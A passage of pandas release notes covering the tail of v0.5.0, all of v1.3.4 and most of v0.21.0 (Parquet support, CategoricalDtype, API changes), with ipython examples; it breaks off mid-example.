:ref:`Implemented <indexing.set_ops>` & and | to intersect / union Index objects, respectively (:issue:`261`)\n- :ref:`Added<reshaping.pivot>` ``pivot_table`` convenience function to pandas namespace (:issue:`234`)\n- :ref:`Implemented <basics.rename_axis>` ``Panel.rename_axis`` function (:issue:`243`)\n- DataFrame will show index level names in console output (:issue:`334`)\n- :ref:`Implemented <advanced.take>` ``Panel.take``\n- :ref:`Added<basics.console_output>` ``set_eng_float_format`` for alternate DataFrame floating point string formatting (ENH61_)\n- :ref:`Added <indexing.set_index>` convenience ``set_index`` function for creating a DataFrame index from its existing columns\n- :ref:`Implemented <groupby.multiindex>` ``groupby`` hierarchical index level name  (:issue:`223`)\n- :ref:`Added <io.store_in_csv>` support for different delimiters in ``DataFrame.to_csv`` (:issue:`244`)\n\nPerformance enhancements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- VBENCH Major performance improvements in file parsing functions ``read_csv`` and ``read_table``\n- VBENCH Added Cython function for converting tuples to ndarray very fast. Speeds up many MultiIndex-related operations\n- VBENCH Refactored merging / joining code into a tidy class and disabled unnecessary computations in the float/object case, thus getting about 10% better performance (:issue:`211`)\n- VBENCH Improved speed of ``DataFrame.xs`` on mixed-type DataFrame objects by about 5x, regression from 0.3.0 (:issue:`215`)\n- VBENCH With new ``DataFrame.align`` method, speeding up binary operations between differently-indexed DataFrame objects by 10-25%.\n- VBENCH Significantly sped up conversion of nested dict into DataFrame (:issue:`212`)\n- VBENCH Significantly speed up DataFrame ``__repr__`` and ``count`` on large mixed-type DataFrame objects\n\n.. _ENH61: https://github.com/pandas-dev/pandas/commit/6141961\n.. _ENH5c: https://github.com/pandas-dev/pandas/commit/5ca6ff5d822ee4ddef1ec0d87b6d83d8b4bbd3eb\n\n\n.. _whatsnew_0.5.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.4.0..v0.5.0\n\n\n.. _whatsnew_134:\n\nWhat's new in 1.3.4 (October 17, 2021)\n--------------------------------------\n\nThese are the changes in pandas 1.3.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.convert_dtypes` incorrectly converts byte strings to strings (:issue:`43183`)\n- Fixed regression in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` were failing silently with mixed data types along ``axis=1`` and :class:`MultiIndex` (:issue:`43209`)\n- Fixed regression in :func:`merge` with integer and ``NaN`` keys failing with ``outer`` merge (:issue:`43550`)\n- Fixed regression in :meth:`DataFrame.corr` raising ``ValueError`` with ``method=\"spearman\"`` on 32-bit platforms (:issue:`43588`)\n- Fixed performance regression in :meth:`MultiIndex.equals` (:issue:`43549`)\n- Fixed performance regression in :meth:`.DataFrameGroupBy.first`, :meth:`.SeriesGroupBy.first`, :meth:`.DataFrameGroupBy.last`, and :meth:`.SeriesGroupBy.last` with :class:`StringDtype` (:issue:`41596`)\n- Fixed regression in :meth:`Series.cat.reorder_categories` failing to update the categories on the ``Series`` (:issue:`43232`)\n- Fixed regression in :meth:`Series.cat.categories` setter failing to update the categories on the ``Series`` (:issue:`43334`)\n- Fixed regression in :func:`read_csv` raising ``UnicodeDecodeError`` exception when ``memory_map=True`` (:issue:`43540`)\n- Fixed regression in :meth:`DataFrame.explode` raising ``AssertionError`` when ``column`` is any scalar which is not a string (:issue:`43314`)\n- Fixed regression in :meth:`Series.aggregate` attempting to pass ``args`` and ``kwargs`` multiple times to the user supplied ``func`` in certain cases (:issue:`43357`)\n- Fixed regression when iterating over a :class:`DataFrame.groupby.rolling` object causing the resulting DataFrames to have an incorrect index if the input groupings were not sorted (:issue:`43386`)\n- Fixed regression in :meth:`DataFrame.groupby.rolling.cov` and :meth:`DataFrame.groupby.rolling.corr` computing incorrect results if the input groupings were not sorted (:issue:`43386`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :meth:`pandas.DataFrame.groupby.rolling` and :class:`pandas.api.indexers.FixedForwardWindowIndexer` leading to segfaults and window endpoints being mixed across groups (:issue:`43267`)\n- Fixed bug in :meth:`.DataFrameGroupBy.mean` and :meth:`.SeriesGroupBy.mean` with datetimelike values including ``NaT`` values returning incorrect results (:issue:`43132`)\n- Fixed bug in :meth:`Series.aggregate` not passing the first ``args`` to the user supplied ``func`` in certain cases (:issue:`43357`)\n- Fixed memory leaks in :meth:`Series.rolling.quantile` and :meth:`Series.rolling.median` (:issue:`43339`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.other:\n\nOther\n~~~~~\n- The minimum version of Cython needed to compile pandas is now ``0.29.24`` (:issue:`43729`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_134.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.3..v1.3.4\n\n\n.. _whatsnew_0210:\n\nVersion 0.21.0 (October 27, 2017)\n---------------------------------\n\n{{ header }}\n\n.. ipython:: python\n   :suppress:\n\n   from pandas import *  noqa F401, F403\n\n\nThis is a major release from 0.20.3 and includes a number of API changes, deprecations, new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\nHighlights include:\n\n- Integration with `Apache Parquet <https://parquet.apache.org/>`__, including a new top-level :func:`read_parquet` function and :meth:`DataFrame.to_parquet` method, see :ref:`here <whatsnew_0210.enhancements.parquet>`.\n- New user-facing :class:`pandas.api.types.CategoricalDtype` for specifying\n  categoricals independent of the data, see :ref:`here <whatsnew_0210.enhancements.categorical_dtype>`.\n- The behavior of ``sum`` and ``prod`` on all-NaN Series/DataFrames is now consistent and no longer depends on whether `bottleneck <https://bottleneck.readthedocs.io>`__ is installed, and ``sum`` and ``prod`` on empty Series now return NaN instead of 0, see :ref:`here <whatsnew_0210.api_breaking.bottleneck>`.\n- Compatibility fixes for pypy, see :ref:`here <whatsnew_0210.pypy>`.\n- Additions to the ``drop``, ``reindex`` and ``rename`` API to make them more consistent, see :ref:`here <whatsnew_0210.enhancements.drop_api>`.\n- Addition of the new methods ``DataFrame.infer_objects`` (see :ref:`here <whatsnew_0210.enhancements.infer_objects>`) and ``GroupBy.pipe`` (see :ref:`here <whatsnew_0210.enhancements.GroupBy_pipe>`).\n- Indexing with a list of labels, where one or more of the labels is missing, is deprecated and will raise a KeyError in a future version, see :ref:`here <whatsnew_0210.api_breaking.loc>`.\n\nCheck the :ref:`API Changes <whatsnew_0210.api_breaking>` and :ref:`deprecations <whatsnew_0210.deprecations>` before updating.\n\n.. contents:: What's new in v0.21.0\n    :local:\n    :backlinks: none\n    :depth: 2\n\n.. _whatsnew_0210.enhancements:\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0210.enhancements.parquet:\n\nIntegration with Apache Parquet file format\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIntegration with `Apache Parquet <https://parquet.apache.org/>`__, including a new top-level :func:`read_parquet` and :func:`DataFrame.to_parquet` method, see :ref:`here <io.parquet>` (:issue:`15838`, :issue:`17438`).\n\n`Apache Parquet <https://parquet.apache.org/>`__ provides a cross-language, binary file format for reading and writing data frames efficiently.\nParquet is designed to faithfully serialize and de-serialize ``DataFrame`` s, supporting all of the pandas\ndtypes, including extension dtypes such as datetime with timezones.\n\nThis functionality depends on either the `pyarrow <http://arrow.apache.org/docs/python/>`__ or `fastparquet <https://fastparquet.readthedocs.io/en/latest/>`__ library.\nFor more details, see :ref:`the IO docs on Parquet <io.parquet>`.\n\n\n.. _whatsnew_0210.enhancements.infer_objects:\n\nMethod ``infer_objects`` type conversion\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`DataFrame.infer_objects` and :meth:`Series.infer_objects`\nmethods have been added to perform dtype inference on object columns, replacing\nsome of the functionality of the deprecated ``convert_objects``\nmethod. See the documentation :ref:`here <basics.object_conversion>`\nfor more details. (:issue:`11221`)\n\nThis method only performs soft conversions on object columns, converting Python objects\nto native types, but not any coercive conversions. For example:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': [1, 2, 3],\n                      'B': np.array([1, 2, 3], dtype='object'),\n                      'C': ['1', '2', '3']})\n   df.dtypes\n   df.infer_objects().dtypes\n\nNote that column ``'C'`` was not converted - only scalar numeric types\nwill be converted to a new type.  Other types of conversion should be accomplished\nusing the :func:`to_numeric` function (or :func:`to_datetime`, :func:`to_timedelta`).\n\n.. ipython:: python\n\n   df = df.infer_objects()\n   df['C'] = pd.to_numeric(df['C'], errors='coerce')\n   df.dtypes\n\n.. _whatsnew_0210.enhancements.attribute_access:\n\nImproved warnings when attempting to create columns\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nNew users are often puzzled by the relationship between column operations and\nattribute access on ``DataFrame`` instances (:issue:`7175`). One specific\ninstance of this confusion is attempting to create a new column by setting an\nattribute on the ``DataFrame``:\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame({'one': [1., 2., 3.]})\n   In [2]: df.two = [4, 5, 6]\n\nThis does not raise any obvious exceptions, but also does not create a new column:\n\n.. code-block:: ipython\n\n   In [3]: df\n   Out[3]:\n       one\n   0  1.0\n   1  2.0\n   2  3.0\n\nSetting a list-like data structure into a new attribute now raises a ``UserWarning`` about the potential for unexpected behavior. See :ref:`Attribute Access <indexing.attribute_access>`.\n\n.. _whatsnew_0210.enhancements.drop_api:\n\nMethod ``drop`` now also accepts index/columns keywords\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`~DataFrame.drop` method has gained ``index``/``columns`` keywords as an\nalternative to specifying the ``axis``. This is similar to the behavior of ``reindex``\n(:issue:`12392`).\n\nFor example:\n\n.. ipython:: python\n\n    df = pd.DataFrame(np.arange(8).reshape(2, 4),\n                      columns=['A', 'B', 'C', 'D'])\n    df\n    df.drop(['B', 'C'], axis=1)\n     the following is now equivalent\n    df.drop(columns=['B', 'C'])\n\n.. _whatsnew_0210.enhancements.rename_reindex_axis:\n\nMethods ``rename``, ``reindex`` now also accept axis keyword\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :meth:`DataFrame.rename` and :meth:`DataFrame.reindex` methods have gained\nthe ``axis`` keyword to specify the axis to target with the operation\n(:issue:`12392`).\n\nHere's ``rename``:\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]})\n   df.rename(str.lower, axis='columns')\n   df.rename(id, axis='index')\n\nAnd ``reindex``:\n\n.. ipython:: python\n\n   df.reindex(['A', 'B', 'C'], axis='columns')\n   df.reindex([0, 1, 3], axis='index')\n\nThe \"index, columns\" style continues to work as before.\n\n.. ipython:: python\n\n   df.rename(index=id, columns=str.lower)\n   df.reindex(index=[0, 1, 3], columns=['A', 'B', 'C'])\n\nWe *highly* encourage using named arguments to avoid confusion when using either\nstyle.\n\n.. _whatsnew_0210.enhancements.categorical_dtype:\n\n``CategoricalDtype`` for specifying categoricals\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`pandas.api.types.CategoricalDtype` has been added to the public API and\nexpanded to include the ``categories`` and ``ordered`` attributes. A\n``CategoricalDtype`` can be used to specify the set of categories and\norderedness of an array, independent of the data. This can be useful for example,\nwhen converting string data to a ``Categorical`` (:issue:`14711`,\n:issue:`15078`, :issue:`16015`, :issue:`17643`):\n\n.. ipython:: python\n\n   from pandas.api.types import CategoricalDtype\n\n   s = pd.Series(['a', 'b', 'c', 'a'])   strings\n   dtype = CategoricalDtype(categories=['a', 'b', 'c', 'd'], ordered=True)\n   s.astype(dtype)\n\nOne place that deserves special mention is in :meth:`read_csv`. Previously, with\n``dtype={'col': 'category'}``, the returned values and categories would always\nbe strings.\n\n.. ipython:: python\n   :suppress:\n\n   from io import StringIO\n\n.. ipython:: python\n\n   data = 'A,B\\na,1\\nb,2\\nc,3'\n   pd.read_csv(StringIO(data), dtype={'B': 'category'}).B.cat.categories\n\nNotice the \"object\" dtype.\n\nWith a ``CategoricalDtype`` of all numerics, datetimes, or\ntimedeltas, we can automatically convert to the correct type\n\n.. ipython:: python\n\n   dtype = {'B': CategoricalDtype([1, 2, 3])}\n   pd.read_csv(StringIO(data), dtype=dtype).B.cat.categories\n\nThe values have been correctly interpreted as integers.\n\nThe ``.dtype`` property of a ``Categorical``, ``CategoricalIndex`` or a\n``Series`` with categorical type will now return an instance of\n``CategoricalDtype``. While the repr has changed, ``str(CategoricalDtype())`` is\nstill the string ``'category'``. We'll take this moment to remind users that the\n*preferred* way to detect categorical data is to use\n:func:`pandas.api.types.is_categorical_dtype`, and not ``str(dtype) == 'category'``.\n\nSee the :ref:`CategoricalDtype docs <categorical.categoricaldtype>` for more.\n\n.. _whatsnew_0210.enhancements.GroupBy_pipe:\n\n``GroupBy`` objects now have a ``pipe`` method\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``GroupBy`` objects now have a ``pipe`` method, similar to the one on\n``DataFrame`` and ``Series``, that allow for functions that take a\n``GroupBy`` to be composed in a clean, readable syntax. (:issue:`17871`)\n\nFor a concrete example on combining ``.groupby`` and ``.pipe`` , imagine having a\nDataFrame with columns for stores, products, revenue and sold quantity. We'd like to\ndo a groupwise calculation of *prices* (i.e. revenue/quantity) per store and per product.\nWe could do this in a multi-step operation, but expressing it in terms of piping can make the\ncode more readable.\n\nFirst we set the data:\n\n.. ipython:: python\n\n   import numpy as np\n   n = 1000\n   df = pd.DataFrame({'Store': np.random.choice(['Store_1', 'Store_2'], n),\n                      'Product': np.random.choice(['Product_1',\n                                                   'Product_2',\n                                                   'Product_3'\n                                                   ], n),\n                      'Revenue': (np.random.random(n) * 50 + 10).round(2),\n                      'Quantity': np.random.randint(1, 10, size=n)})\n   df.head(2)\n\nNow, to find prices per store/product, we can simply do:\n\n.. ipython:: python\n\n   (df.groupby(['Store', 'Product'])\n      .pipe(lambda grp: grp.Revenue.sum() / grp.Quantity.sum())\n      .unstack().round(2))\n\nSee the :ref:`documentation <groupby.pipe>` for more.\n\n\n.. _whatsnew_0210.enhancements.rename_categories:\n\n``Categorical.rename_categories`` accepts a dict-like\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`~Series.cat.rename_categories` now accepts a dict-like argument for\n``new_categories``. The previous categories are looked up in the dictionary's\nkeys and replaced if found. The behavior of missing and extra keys is the same\nas in :meth:`DataFrame.rename`.\n\n.. ipython:: python\n\n   c = pd.Categorical(['a', 'a', 'b'])\n   c.rename_categories({\"a\": \"eh\", \"b\": \"bee\"})\n\n.. warning::\n\n    To assist with upgrading pandas, ``rename_categories`` treats ``Series`` as\n    list-like. Typically, Series are considered to be dict-like (e.g. in\n    ``.rename``, ``.map``). In a future version of pandas ``rename_categories``\n    will change to treat them as dict-like. Follow the warning message's\n    recommendations for writing future-proof code.\n\n    .. code-block:: ipython\n\n        In [33]: c.rename_categories(pd.Series([0, 1], index=['a', 'c']))\n        FutureWarning: Treating Series 'new_categories' as a list-like and using the values.\n        In a future version, 'rename_categories' will treat Series like a dictionary.\n        For dict-like, use 'new_categories.to_dict()'\n        For list-like, use 'new_categories.values'.\n        Out[33]:\n        [0, 0, 1]\n        Categories (2, int64): [0, 1]\n\n\n.. _whatsnew_0210.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\nNew functions or methods\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n- :meth:`.Resampler.nearest` is added to support nearest-neighbor upsampling (:issue:`17496`).\n- :class:`~pandas.Index` has added support for a ``to_frame`` method (:issue:`15230`).\n\nNew keywords\n\"\"\"\"\"\"\"\"\"\"\"\"\n\n- Added a ``skipna`` parameter to :func:`~pandas.api.types.infer_dtype` to\n  support type inference in the presence of missing values (:issue:`17059`).\n- :func:`Series.to_dict` and :func:`DataFrame.to_dict` now support an ``into`` keyword which allows you to specify the ``collections.Mapping`` subclass that you would like returned.  The default is ``dict``, which is backwards compatible. (:issue:`16122`)\n- :func:`Series.set_axis` and :func:`DataFrame.set_axis` now support the ``inplace`` parameter. (:issue:`14636`)\n- :func:`Series.to_pickle` and :func:`DataFrame.to_pickle` have gained a ``protocol`` parameter (:issue:`16252`). By default, this parameter is set to `HIGHEST_PROTOCOL <https://docs.python.org/3/library/pickle.html#data-stream-format>`__\n- :func:`read_feather` has gained the ``nthreads`` parameter for multi-threaded operations (:issue:`16359`)\n- :func:`DataFrame.clip()` and :func:`Series.clip()` have gained an ``inplace`` argument. (:issue:`15388`)\n- :func:`crosstab` has gained a ``margins_name`` parameter to define the name of the row / column that will contain the totals when ``margins=True``. (:issue:`15972`)\n- :func:`read_json` now accepts a ``chunksize`` parameter that can be used when ``lines=True``. If ``chunksize`` is passed, read_json now returns an iterator which reads in ``chunksize`` lines with each iteration. (:issue:`17048`)\n- :func:`read_json` and :func:`~DataFrame.to_json` now accept a ``compression`` argument which allows them to transparently handle compressed files. (:issue:`17798`)\n\nVarious enhancements\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n- Improved the import time of pandas by about 2.25x.  (:issue:`16764`)\n- Support for `PEP 519 -- Adding a file system path protocol\n  <https://www.python.org/dev/peps/pep-0519/>`_ on most readers (e.g.\n  :func:`read_csv`) and writers (e.g. :meth:`DataFrame.to_csv`) (:issue:`13823`).\n- Added a ``__fspath__`` method to ``pd.HDFStore``, ``pd.ExcelFile``,\n  and ``pd.ExcelWriter`` to work properly with the file system path protocol (:issue:`13823`).\n- The ``validate`` argument for :func:`merge` now checks whether a merge is one-to-one, one-to-many, many-to-one, or many-to-many. If a merge is found to not be an example of specified merge type, an exception of type ``MergeError`` will be raised. For more, see :ref:`here <merging.validation>` (:issue:`16270`)\n- Added support for `PEP 518 <https://www.python.org/dev/peps/pep-0518/>`_ (``pyproject.toml``) to the build system (:issue:`16745`)\n- :func:`RangeIndex.append` now returns a ``RangeIndex`` object when possible (:issue:`16212`)\n- :func:`Series.rename_axis` and :func:`DataFrame.rename_axis` with ``inplace=True`` now return ``None`` while renaming the axis inplace. (:issue:`15704`)\n- :func:`api.types.infer_dtype` now infers decimals. (:issue:`15690`)\n- :func:`DataFrame.select_dtypes` now accepts scalar values for include/exclude as well as list-like. (:issue:`16855`)\n- :func:`date_range` now accepts 'YS' in addition to 'AS' as an alias for start of year. (:issue:`9313`)\n- :func:`date_range` now accepts 'Y' in addition to 'A' as an alias for end of year. (:issue:`9313`)\n- :func:`DataFrame.add_prefix` and :func:`DataFrame.add_suffix` now accept strings containing the '%' character. (:issue:`17151`)\n- Read/write methods that infer compression (:func:`read_csv`, :func:`read_table`, :func:`read_pickle`, and :meth:`~DataFrame.to_pickle`) can now infer from path-like objects, such as ``pathlib.Path``. (:issue:`17206`)\n- :func:`read_sas` now recognizes much more of the most frequently used date (datetime) formats in SAS7BDAT files. (:issue:`15871`)\n- :func:`DataFrame.items` and :func:`Series.items` are now present in both Python 2 and 3 and is lazy in all cases. (:issue:`13918`, :issue:`17213`)\n- :meth:`pandas.io.formats.style.Styler.where` has been implemented as a convenience for :meth:`pandas.io.formats.style.Styler.applymap`. (:issue:`17474`)\n- :func:`MultiIndex.is_monotonic_decreasing` has been implemented.  Previously returned ``False`` in all cases. (:issue:`16554`)\n- :func:`read_excel` raises ``ImportError`` with a better message if ``xlrd`` is not installed. (:issue:`17613`)\n- :meth:`DataFrame.assign` will preserve the original order of ``**kwargs`` for Python 3.6+ users instead of sorting the column names. (:issue:`14207`)\n- :func:`Series.reindex`, :func:`DataFrame.reindex`, :func:`Index.get_indexer` now support list-like argument for ``tolerance``. (:issue:`17367`)\n\n.. _whatsnew_0210.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_0210.api_breaking.deps:\n\nDependencies have increased minimum versions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe have updated our minimum supported versions of dependencies (:issue:`15206`, :issue:`15543`, :issue:`15214`).\nIf installed, we now require:\n\n   +--------------+-----------------+----------+\n   | Package      | Minimum Version | Required |\n   +==============+=================+==========+\n   | Numpy        | 1.9.0           |    X     |\n   +--------------+-----------------+----------+\n   | Matplotlib   | 1.4.3           |          |\n   +--------------+-----------------+----------+\n   | Scipy        | 0.14.0          |          |\n   +--------------+-----------------+----------+\n   | Bottleneck   | 1.0.0           |          |\n   +--------------+-----------------+----------+\n\nAdditionally, support has been dropped for Python 3.4 (:issue:`15251`).\n\n\n.. _whatsnew_0210.api_breaking.bottleneck:\n\nSum/prod of all-NaN or empty Series/DataFrames is now consistently NaN\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. note::\n\n   The changes described here have been partially reverted. See\n   the :ref:`v0.22.0 Whatsnew <whatsnew_0220>` for more.\n\n\nThe behavior of ``sum`` and ``prod`` on all-NaN Series/DataFrames no longer depends on\nwhether `bottleneck <https://bottleneck.readthedocs.io>`__ is installed, and return value of ``sum`` and ``prod`` on an empty Series has changed (:issue:`9422`, :issue:`15507`).\n\nCalling ``sum`` or ``prod`` on an empty or all-``NaN`` ``Series``, or columns of a ``DataFrame``, will result in ``NaN``. See the :ref:`docs <missing_data.calculations>`.\n\n.. ipython:: python\n\n   s = pd.Series([np.nan])\n\nPreviously WITHOUT ``bottleneck`` installed:\n\n.. code-block:: ipython\n\n   In [2]: s.sum()\n   Out[2]: np.nan\n\nPreviously WITH ``bottleneck``:\n\n.. code-block:: ipython\n\n   In [2]: s.sum()\n   Out[2]: 0.0\n\nNew behavior, without regard to the bottleneck installation:\n\n.. ipython:: python\n\n   s.sum()\n\nNote that this also changes the sum of an empty ``Series``. Previously this always returned 0 regardless of a ``bottleneck`` installation:\n\n.. code-block:: ipython\n\n   In [1]: pd.Series([]).sum()\n   Out[1]: 0\n\nbut for consistency with the all-NaN case, this was changed to return 0 as well:\n\n.. code-block:: ipython\n\n   In [2]: pd.Series([]).sum()\n   Out[2]: 0\n\n.. _whatsnew_0210.api_breaking.loc:\n\nIndexing with a list with missing labels is deprecated\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, selecting with a list of labels, where one or more labels were missing would always succeed, returning ``NaN`` for missing labels.\nThis will now show a ``FutureWarning``. In the future this will raise a ``KeyError`` (:issue:`15747`).\nThis warning will trigger on a ``DataFrame`` or a ``Series`` for using ``.loc[]``  or ``[[]]`` when passing a list-of-labels with at least 1 missing label.\n\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3])\n   s\n\nPrevious behavior\n\n.. code-block:: ipython\n\n   In [4]: s.loc[[1, 2, 3]]\n   Out[4]:\n   1    2.0\n   2    3.0\n   3    NaN\n   dtype: float64\n\n\nCurrent behavior\n\n.. code-block:: ipython\n\n   In [4]: s.loc[[1, 2, 3]]\n   Passing list-likes to .loc or [] with any missing label will raise\n   KeyError in the future, you can use .reindex() as an alternative.\n\n   See the documentation here:\n   https://pandas.pydata.org/pandas-docs/stable/indexing.html#deprecate-loc-reindex-listlike\n\n   Out[4]:\n   1    2.0\n   2    3.0\n   3    NaN\n   dtype: float64\n\nThe idiomatic way to achieve selecting potentially not-found elements is via ``.reindex()``\n\n.. ipython:: python\n\n   s.reindex([1, 2, 3])\n\nSelection with all keys found is unchanged.\n\n.. ipython:: python\n\n   s.loc[[1, 2]]\n\n\n.. _whatsnew_0210.api.na_changes:\n\nNA naming changes\n^^^^^^^^^^^^^^^^^\n\nIn order to promote more consistency among the pandas API, we have added additional top-level\nfunctions :func:`isna` and :func:`notna` that are aliases for :func:`isnull` and :func:`notnull`.\nThe naming scheme is now more consistent with methods like ``.dropna()`` and ``.fillna()``. Furthermore\nin all cases where ``.isnull()`` and ``.notnull()`` methods are defined, these have additional methods\nnamed ``.isna()`` and ``.notna()``, these are included for classes ``Categorical``,\n``Index``, ``Series``, and ``DataFrame``. (:issue:`15001`).\n\nThe configuration option ``pd.options.mode.use_inf_as_null`` is deprecated, and ``pd.options.mode.use_inf_as_na`` is added as a replacement.\n\n\n.. _whatsnew_0210.api_breaking.iteration_scalars:\n\nIteration of Series/Index will now return Python scalars\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, when using certain iteration methods for a ``Series`` with dtype ``int`` or ``float``, you would receive a ``numpy`` scalar, e.g. a ``np.int64``, rather than a Python ``int``. Issue (:issue:`10904`) corrected this for ``Series.tolist()`` and ``list(Series)``. This change makes all iteration methods consistent, in particular, for ``__iter__()`` and ``.map()``; note that this only affects int/float dtypes. (:issue:`13236`, :issue:`13258`, :issue:`14216`).\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3])\n   s\n\nPreviously:\n\n.. code-block:: ipython\n\n   In [2]: type(list(s)[0])\n   Out[2]: numpy.int64\n\nNew behavior:\n\n.. ipython:: python\n\n   type(list(s)[0])\n\nFurthermore this will now correctly box the results of iteration for :func:`DataFrame.to_dict` as well.\n\n.. ipython:: python\n\n   d = {'a': [1], 'b': ['b']}\n   df = pd.DataFrame(d)\n\nPreviously:\n\n.. code-block:: ipython\n\n   In [8]: type(df.to_dict()['a'][0])\n   Out[8]: numpy.int64\n\nNew behavior:\n\n.. ipython:: python\n\n   type(df.to_dict()['a'][0])\n\n\n.. _whatsnew_0210.api_breaking.loc_with_index:\n\nIndexing with a Boolean Index\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously when passing a boolean ``Index`` to ``.loc``, if the index of the ``Series/DataFrame`` had ``boolean`` labels,\nyou would get a label based selection, potentially duplicating result labels, rather than a boolean indexing selection\n(where ``True`` selects elements), this was inconsistent how a boolean numpy array indexed. The new behavior is to\nact like a boolean numpy array indexer. (:issue:`17738`)\n\nPrevious behavior:\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3], index=[False, True, False])\n   s\n\n.. code-block:: ipython\n\n   In [59]: s.loc[pd.Index([True, False, True])]\n   Out[59]:\n   True     2\n   False    1\n   False    3\n   True     2\n   dtype: int64\n\nCurrent behavior\n\n.. ipython:: python\n\n   s.loc[pd.Index([True, False, True])]\n\n\nFurthermore, previously if you had an index that was non-numeric (e.g. strings), then a boolean Index would raise a ``KeyError``.\nThis will now be treated as a boolean indexer.\n\nPreviously behavior:\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3], index=['a', 'b', 'c'])\n   s\n\n.. code-block:: ipython\n\n   In [39]: s.loc[pd.Index([True, False, True])]\n   KeyError: \"None of [Index([True, False, True], dtype='object')] are in the [index]\"\n\nCurrent behavior\n\n.. ipython:: python\n\n   s.loc[pd.Index([True, False, True])]\n\n\n.. _whatsnew_0210.api_breaking.period_index_resampling:\n\n``PeriodIndex`` resampling\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, resampling a ``Series``/``DataFrame`` indexed by a ``PeriodIndex`` returned a ``DatetimeIndex`` in some cases (:issue:`12884`). Resampling to a multiplied frequency now returns a ``PeriodIndex`` (:issue:`15944`). As a minor enhancement, resampling a ``PeriodIndex`` can now handle ``NaT`` values (:issue:`13224`)\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [1]: pi = pd.period_range('2017-01', periods=12, freq='M')\n\n   In [2]: s = pd.Series(np.arange(12), index=pi)\n\n   In [3]: resampled = s.resample('2Q').mean()\n\n   In [4]: resampled\n   Out[4]:\n   2017-03-31     1.0\n   2017-09-30     5.5\n   2018-03-31    10.0\n   Freq: 2Q-DEC, dtype: float64\n\n   In [5]: resampled.index\n   Out[5]: DatetimeIndex(['2017-03-31', '2017-09-30', '2018-03-31'], dtype='datetime64[ns]', freq='2Q-DEC')\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [1]: pi = pd.period_range('2017-01', periods=12, freq='M')\n\n   In [2]: s = pd.Series(np.arange(12), index=pi)\n\n   In [3]: resampled = s.resample('2Q').mean()\n\n   In [4]: resampled\n   Out[4]:\n   2017Q1    2.5\n   2017Q3    8.5\n   Freq: 2Q-DEC, dtype: float64\n\n   In [5]: resampled.index\n   Out[5]: PeriodIndex(['2017Q1', '2017Q3'], dtype='period[2Q-DEC]')\n\nUpsampling and calling ``.ohlc()`` previously returned a ``Series``, basically identical to calling ``.asfreq()``. OHLC upsampling now returns a DataFrame with columns ``open``, ``high``, ``low`` and ``close`` (:issue:`13083`). This is consistent with downsampling and ``DatetimeIndex`` behavior.\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [1]: pi = pd.period_range(start='2000-01-01', freq='D', periods=10)\n\n   In [2]: s = pd.Series(np.arange(10), index=pi)\n\n   In [3]: s.resample('H').ohlc()\n   Out[3]:\n   2000-01-01 00:00    0.0\n                   ...\n   2000-01-10 23:00    NaN\n   Freq: H, Length: 240, dtype: float64\n\n   In [4]: s.resample('M').ohlc()\n   Out[4]:\n            open  high  low  close\n   2000-01     0     9    0      9\n\nNew behavior:\n\n.. code-block:: ipython\n\n   In [56]: pi = pd.period_range(start='2000-01-01', freq='D', periods=10)\n\n   In [57]: s = pd.Series(np.arange(10), 